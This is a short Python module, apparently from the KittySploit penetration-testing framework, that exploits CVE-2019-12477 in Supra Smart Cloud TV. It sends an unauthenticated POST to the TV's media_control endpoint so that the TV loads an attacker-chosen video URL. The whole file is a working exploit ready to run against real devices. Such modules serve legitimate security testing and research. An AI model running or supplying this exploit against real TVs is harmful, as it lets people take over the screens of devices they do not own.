from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Auxiliary, Http_client):
	
	__info__ = {
		'name': 'Supra Smart Cloud TV rfi',
		'description': 'Supra Smart Cloud TV allows remote file inclusion in the openLiveURL',
		'author': 'KittySploit Team',
		'cve': '2019-12477',
	}

	urlVideo = OptString("", "URL of the video","yes")
	
	def run(self):

		headers = {
			'Content-Type':'application/json',
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
			'Accept-Encoding': 'gzip, deflate',
			'Connection': 'close'     
		}

		creds = self.http_request(
						method = "POST",
						path = "/remote/media_control?action=setUri&uri={}".format(self.urlVideo),
						headers = headers,
						)
		
		if creds.status_code == 200:
		   print_success('Done!')
		else:
			print_error("Failed : status code {}".format(creds.status_code))
